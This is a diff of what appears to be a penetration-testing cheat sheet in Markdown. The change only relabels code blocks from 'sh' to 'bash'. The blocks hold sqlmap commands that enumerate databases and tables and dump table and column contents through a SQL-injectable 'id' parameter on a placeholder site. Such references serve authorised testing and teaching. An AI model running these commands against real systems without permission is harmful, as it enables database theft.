@@ -12,25 +12,25 @@ In the next commands, `id` is a query parameter that is vulnerable to SQL inject
 
 Enumerate databases.
 
-```sh
+```bash
 sqlmap -u "http://website.com/?id=1" --batch --dbs
 ```
 
 Enumerate tables of a specific database.
 
-```sh
+```bash
 sqlmap -u "http://website.com/?id=1" --batch --tables -D db_name
 ```
 
 Enumerate tables content of a specific database.
 
-```sh
+```bash
 sqlmap -u "http://website.com/?id=1" --batch --dump -D db_name
 ```
 
 Enumerate content by specifing table, column, and database.
 
-```sh
+```bash
 sqlmap -u "http://website.com/?id=1" --batch --dump -D db_name -T table_name -C col_name
 ```
 
